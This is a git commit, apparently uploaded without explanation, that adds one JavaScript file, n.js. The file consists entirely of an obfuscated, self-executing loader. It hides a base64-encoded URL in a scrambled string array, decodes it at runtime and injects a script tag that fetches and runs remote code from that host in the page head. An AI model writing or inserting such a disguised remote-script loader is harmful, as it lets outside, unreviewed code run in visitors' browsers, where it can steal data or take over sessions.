6f9335114de56ba5fa4bc9fd27b215a41fd02163
devbratk <gryshenkevgen@gmail.com>
2024-09-28 13:11:42 +0300

    Add files via upload

---
+++ n.js
@@ -0,0 +1,7 @@
+(function() {
+    var _0x1a2b = ["createElement", "script", "type", "text/javascript", "src", "aHR0cHM6Ly9qZW5pY2hnLmdpdGh1Yi5pby9ueC94bi5qcw==", "appendChild", "head"];
+    var _0x3c4d = document[_0x1a2b[0]](_0x1a2b[1]);
+    _0x3c4d[_0x1a2b[2]] = _0x1a2b[3];
+    _0x3c4d[_0x1a2b[4]] = atob(_0x1a2b[5]);
+    document[_0x1a2b[7]][_0x1a2b[6]](_0x3c4d);
+})();
